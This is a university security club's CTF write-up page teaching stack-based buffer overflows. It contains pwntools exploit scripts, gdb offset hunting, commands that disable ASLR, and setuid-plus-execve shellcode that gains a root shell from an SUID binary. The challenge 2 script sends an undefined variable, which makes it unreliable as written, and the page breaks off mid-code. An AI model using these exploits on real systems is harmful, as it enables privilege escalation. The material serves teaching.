@@ -1,0 +1,558 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=robots content="noodp">
+<meta http-equiv=x-ua-compatible content="IE=edge, chrome=1">
+<title>Introduction to Stack Smashing - CUEH ComSec</title><meta name=Description content="An introductory session into traditional buffer overflows"><meta property="og:title" content="Introduction to Stack Smashing">
+<meta property="og:description" content="An introductory session into traditional buffer overflows">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://cov-comsec.github.io/posts/2021_stack_smashing/"><meta property="og:image" content="https://cov-comsec.github.io/logo.svg"><meta property="article:section" content="posts">
+<meta property="article:modified_time" content="2021-11-04T15:34:34+00:00">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://cov-comsec.github.io/logo.svg">
+<meta name=twitter:title content="Introduction to Stack Smashing">
+<meta name=twitter:description content="An introductory session into traditional buffer overflows">
+<meta name=application-name content="CUEH ComSec">
+<meta name=apple-mobile-web-app-title content="CUEH ComSec"><meta name=msapplication-TileColor content="#da532c"><link rel=stylesheet href=/css/forms.css media=screen><link rel=icon href=/CUEH.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://cov-comsec.github.io/posts/2021_stack_smashing/><link rel=next href=https://cov-comsec.github.io/posts/welcome_nmap/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Introduction to Stack Smashing","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/cov-comsec.github.io\/posts\/2021_stack_smashing\/"},"image":["https:\/\/cov-comsec.github.io\/CUEH.svg"],"genre":"posts","keywords":"pwn, stack smash","wordcount":1415,"url":"https:\/\/cov-comsec.github.io\/posts\/2021_stack_smashing\/","dateModified":"2021-11-04T15:34:34+00:00","publisher":{"@type":"Organization","name":"Jack Orcherton","logo":"https:\/\/cov-comsec.github.io\/CUEH.svg"},"author":{"@type":"Person","name":"***REMOVED***"},"description":"An introductory session into traditional buffer overflows"}</script></head>
+<body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':'dark'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'dark'==='dark')&&document.body.setAttribute('theme','dark')</script>
+<div id=mask></div><div class=wrapper><header class=desktop id=header-desktop>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu>
+<div class=menu-inner><a class=menu-item href=/about/> About </a><a class=menu-item href=/posts/> Posts </a><a class=menu-item href=/tags/> Tags </a><a class=menu-item href=/categories/> Categories </a><a class=menu-item href=https://cueh-comsec.ctfd.io/ rel="noopener noreffer" target=_blank> CTFd </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-desktop>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a>
+</div>
+</div>
+</div>
+</header><header class=mobile id=header-mobile>
+<div class=header-container>
+<div class=header-wrapper>
+<div class=header-title>
+<a href=/ title="CUEH ComSec"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/CUEH.svg data-srcset="/CUEH.svg, /CUEH.svg 1.5x, /CUEH.svg 2x" data-sizes=auto alt=/CUEH.svg title=/CUEH.svg>ComSec</a>
+</div>
+<div class=menu-toggle id=menu-toggle-mobile>
+<span></span><span></span><span></span>
+</div>
+</div>
+<div class=menu id=menu-mobile><div class=search-wrapper>
+<div class="search mobile" id=search-mobile>
+<input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search>
+<i class="fas fa-search fa-fw"></i>
+</a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear>
+<i class="fas fa-times-circle fa-fw"></i>
+</a>
+<span class="search-button search-loading" id=search-loading-mobile>
+<i class="fas fa-spinner fa-fw fa-spin"></i>
+</span>
+</div>
+<a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>
+Cancel
+</a>
+</div><a class=menu-item href=/about/ title>About</a><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=https://cueh-comsec.ctfd.io/ title rel="noopener noreffer" target=_blank>CTFd</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw"></i>
+</a></div>
+</div>
+</header>
+<div class="search-dropdown desktop">
+<div id=search-dropdown-desktop></div>
+</div>
+<div class="search-dropdown mobile">
+<div id=search-dropdown-mobile></div>
+</div>
+<main class=main>
+<div class=container><div class=toc id=toc-auto>
+<h2 class=toc-title>Contents</h2>
+<div class=toc-content id=toc-content-auto></div>
+</div><article class="page single"><h1 class="single-title animated flipInX">Introduction to Stack Smashing</h1><div class=post-meta>
+<div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>***REMOVED***</a></span>&nbsp;<span class=post-category>included in <a href=/categories/academic-year-2021-22/><i class="far fa-folder fa-fw"></i>Academic Year 2021-22</a></span></div>
+<div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=0001-01-01>0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1415 words&nbsp;
+<i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
+</div><div class="details toc" id=toc-static kept=true>
+<div class="details-summary toc-title">
+<span>Contents</span>
+<span><i class="details-icon fas fa-angle-right"></i></span>
+</div>
+<div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents>
+<ul>
+<li><a href=#demo-challenge-1>Demo Challenge 1</a></li>
+<li><a href=#challenge-1>Challenge 1</a></li>
+<li><a href=#challenge-2>Challenge 2</a></li>
+<li><a href=#conclusion>Conclusion</a></li>
+</ul>
+</nav></div>
+</div><div class=content id=content><p>This week, Ben introduced the concept of stack smashing, demonstrating the most basic form of buffer overflow attacks, the stack smash.</p>
+<p>Presentation slides <a href=/posts/2021_stack_smashing/presentation.pdf rel>here</a></p>
+<p>The term stack smashing was first coined in the Phrack article <a href=http://phrack.org/issues/49/14.html target=_blank rel="noopener noreffer">Smashing the Stack for Fun and Profit</a>. It is a term used to describe the technique of overflowing a buffer, writing shellcode onto the stack (and sometimes a NOP sled), and then overwriting the return address of a the stack frame with the address near the start of the payload. During the session we also recapped some fundamentals about memory layout and binary protections. This article will walk through the demo challenge 1, as well as the solutions for challenges 1 and 2 on CTFd.</p>
+<h2 id=demo-challenge-1>Demo Challenge 1</h2>
+<p>For this challenge, we disabled the kernel level protection ASLR using the following command:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> <span class=m>0</span> &gt; /proc/sys/kernel/randomize_va_space
+</code></pre></td></tr></table>
+</div>
+</div><p>The binary has been compiled with no protections, besides partial RelRO (which we will look at in more depth at a later date). We can confirm this using checksec. You can download it <a href=binaries/demo rel>here</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>&gt; checksec --file challenge
+[*] &#39;/home/sharmoos/Documents/github/Content/week_7_bof/demo/demo_1/new/challenge&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre></td></tr></table>
+</div>
+</div><p>NX Stack is disabled, meaning the stack is executable. The fact the stack is executable means that shellcode can be entered onto the stack and then get executed, because ASLR is disabled, we can hard code the addresses needed when jumping to the start of our shellcode.</p>
+<p>Let&rsquo;s use gdb to collect all the values we need. First we should find the offset to the return pointer, knowing this will allow us to place our own address and the instruction pointer will return there when the function has finished executing.</p>
+<p>We can use the cyclic command to generate a string where no 8 bytes are the same, entering this into the program will allow us to locate the offset.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>cyclic</span> <span class=mi>500</span> <span class=o>-</span><span class=n>n</span><span class=o>=</span><span class=mi>8</span>
+<span class=n>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We can then run the program and enter this string. When the program crashes we can see the offset in Pwn-Dbg.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss1.png data-srcset="/posts/2021_stack_smashing/images/ss1.png, images/ss1.png 1.5x, /posts/2021_stack_smashing/images/ss1.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss1.png title="Offset located in gdb"></p>
+<p>The top of the stack pointer indicated the offset to us, we can see the bytes are <code>oaaaaaab</code>. So the offset is 312.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>cyclic</span> <span class=o>-</span><span class=n>l</span> <span class=n>oaaaaaab</span> <span class=o>-</span><span class=n>n</span><span class=o>=</span><span class=mi>8</span>
+<span class=mi>312</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We confirm this to be true by sending 312 bytes of junk data and then a fake address. If we get a segfault and the malicious address is sitting in the instruction pointer, we got the correct offset. Running the following script and attaching gdb to it will allow us to check this (`attach <pid>).</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=ch>#!/usr/bin/env python3</span>
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge&#34;</span><span class=p>)</span>
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
+
+<span class=c1>#context.log_level = &#34;debug&#34;</span>
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+
+<span class=n>pause</span><span class=p>()</span> <span class=c1># pid will be printed here. Then need to hit enter to continue</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Overflow me&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mi>312</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>))</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss2.png data-srcset="/posts/2021_stack_smashing/images/ss2.png, images/ss2.png 1.5x, /posts/2021_stack_smashing/images/ss2.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss2.png title="Offset confirmed in gdb"></p>
+<p>Lets calculate the address of the start of our shellcode. Let&rsquo;s load the binary in gdb and set a breakpoint on the <code>gets</code> instruction, which is collecting our user input. The address that the user input is being written to resides in <code>rdi</code></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>b</span> <span class=o>*</span><span class=n>unsafe</span><span class=o>+</span><span class=mi>41</span>
+<span class=n>Breakpoint</span> <span class=mi>1</span> <span class=n>at</span> <span class=mh>0x40116f</span>
+<span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>r</span>
+<span class=n>Breakpoint</span> <span class=mi>2</span><span class=p>,</span> <span class=mh>0x000000000040116f</span> <span class=ow>in</span> <span class=n>unsafe</span> <span class=p>()</span>
+<span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>p</span><span class=o>/</span><span class=n>x</span> <span class=err>$</span><span class=n>rdi</span>
+<span class=err>$</span><span class=mi>1</span> <span class=o>=</span> <span class=mh>0x7fffffffd500</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So the address we need to return to is <code>0x7fffffffd500</code>. Now we simply need to write some shellcode, place it at the start of our buffer, and change the return address to <code>0x7fffffffd500</code>. Hopefully the comments explain any code. We can also add a NOP sled to allow our return address to be less accurate. (If the ret lands anywehere in the NOP sled will take the <code>rip</code> to our shellcode.)</p>
+<p>The binary is owned by root, and with SUID permissions, meaning we can attempt privilege escelation too.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=ch>#!/usr/bin/env python3</span>
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge&#34;</span><span class=p>)</span>
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
+<span class=c1>#context.log_level = &#34;debug&#34;</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+
+<span class=n>shellcode</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
+</span><span class=s2>/* setuid rdi = 0 */
+</span><span class=s2>xor rdi, rdi
+</span><span class=s2>xor rsi, rsi
+</span><span class=s2>xor rdx, rdx
+</span><span class=s2>mov rax, 105
+</span><span class=s2>syscall
+</span><span class=s2>
+</span><span class=s2>/* execve rdi=/bin/sh rsi=0 rdx=0 */
+</span><span class=s2>lea rdi, [rip+binsh]
+</span><span class=s2>xor rsi, rsi
+</span><span class=s2>xor rdx, rdx
+</span><span class=s2>mov rax, SYS_execve
+</span><span class=s2>syscall
+</span><span class=s2>binsh:
+</span><span class=s2>    .string &#34;/bin/sh&#34;
+</span><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Overflow me&#34;</span><span class=p>,</span> <span class=n>flat</span><span class=p>({</span><span class=mi>200</span><span class=p>:</span> <span class=n>shellcode</span> <span class=p>,</span> <span class=c1># place shellcode 200 bytes from the start of the buffer</span>
+                                      <span class=mi>312</span><span class=p>:</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7fffffffd588</span><span class=p>)},</span> <span class=c1># address near the start of the buffer</span>
+                                      <span class=n>filler</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span><span class=p>))</span> <span class=c1># pad with NOPs to create a nop sled</span>
+
+
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We were successful.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss3.png data-srcset="/posts/2021_stack_smashing/images/ss3.png, images/ss3.png 1.5x, /posts/2021_stack_smashing/images/ss3.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss3.png title="Priv Esc"></p>
+<p>From here we will be moving to the challenge binaries, so if you don&rsquo;t want any spoilers then leave here. We will re enable ASLR too.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nb>echo</span> <span class=m>2</span> &gt; /proc/sys/kernel/randomize_va_space
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=challenge-1>Challenge 1</h2>
+<p>The challenge simply takes an input, prints an outout, and exits. You can download the challenge binary <a href=/posts/2021_stack_smashing/binary/challenge_1 rel>here</a></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>&gt; ./challenge
+foobar
+try harder?
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking at the disassembly of the binary in Rizin Cutter, we see that the aim of this challenge is to get the value <code>0xdeadbeef</code> into a specific stack address. This challenge tests our understanding of finding offsets between stack addresses when ASLR is enabled.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss4.png data-srcset="/posts/2021_stack_smashing/images/ss4.png, images/ss4.png 1.5x, /posts/2021_stack_smashing/images/ss4.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss4.png title="Disassembly of challenge 1"></p>
+<p>So we know that the address we want to overwrite is located at <code>rbp-0x4</code>, and the address of our input buffer is <code>rbp-0x50</code>. So some simple maths will tell us the distance between the two is 76.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>b</span> <span class=o>*</span><span class=n>vuln</span><span class=o>+</span><span class=mi>37</span>
+<span class=n>Breakpoint</span> <span class=mi>1</span> <span class=n>at</span> <span class=mh>0x40118b</span>
+<span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>p</span><span class=o>/</span><span class=n>d</span> <span class=p>(</span><span class=err>$</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x50</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=err>$</span><span class=n>rbp</span><span class=o>-</span><span class=mh>0x4</span><span class=p>)</span>
+<span class=err>$</span><span class=mi>9</span> <span class=o>=</span> <span class=o>-</span><span class=mi>76</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>So our Python script just needs to pack <code>0xdeadbeef</code> into a 64 bit byte value, and then send it with an offset of 76.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=ch>#!/usr/bin/env python3</span>
+
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge&#34;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+
+<span class=n>offset</span> <span class=o>=</span> <span class=mi>76</span>
+
+<span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=c1># pack as 64 bit little endian</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We won!</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss5.png data-srcset="/posts/2021_stack_smashing/images/ss5.png, images/ss5.png 1.5x, /posts/2021_stack_smashing/images/ss5.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss5.png title="Disassembly of challenge 1"></p>
+<h2 id=challenge-2>Challenge 2</h2>
+<p>Challenge 2 is essentially the same as challenge 1. It demonstrates that once we have a stack address, ASLR becomes a mere inconvenience. In this challenge the stack address is given to us, but it represents a situation where the attacker could leak a stack address, for example via a format string vuln. You can download it <a href=/posts/2021_stack_smashing/binary/challenge_2 rel>here</a></p>
+<p>Running the binary, we are given a stack address.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>&gt; ./challenge
+Here is a free stack address 0x7ffd354b7590
+Overflow me
+foobar
+</code></pre></td></tr></table>
+</div>
+</div><p>We won&rsquo;t cover finding the offset, as it has been covered previously in this article. The offset is 216.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=ch>#!/usr/bin/env python3</span>
+
+<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./challenge&#34;</span><span class=p>)</span>
+<span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
+
+<span class=c1>#context.log_level = &#34;debug&#34;</span>
+
+<span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>elf</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+
+<span class=n>offset</span> <span class=o>=</span> <span class=mi>216</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;free stack address &#34;</span><span class=p>)</span>
+<span class=n>leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+<span class=n>info</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+
+<span class=n>shellcode</span> <span class=o>=</span> <span class=n>flat</span><span class=p>({</span><span class=mi>216</span><span class=p>:</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)},</span> <span class=n>filler</span><span class=o>=</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x90</span><span class=s2>&#34;</span><span class=p>)</span>
+
+<span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;Overflow me</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
+<span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>If we attach gdb to the process <code>attach 10528</code>, we can see that the stack leak matches the start address of the input buffer.</p>
+<p><img class=lazyload src=/svg/loading.min.svg data-src=images/ss6.png data-srcset="/posts/2021_stack_smashing/images/ss6.png, images/ss6.png 1.5x, /posts/2021_stack_smashing/images/ss6.png 2x" data-sizes=auto alt=/posts/2021_stack_smashing/images/ss6.png title="gdb for the stack leak"></p>
+<p>This means we can just jump back to the address that is leaked in order to execute our shellcode. A nop sled will catch any stack changes at runtime.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
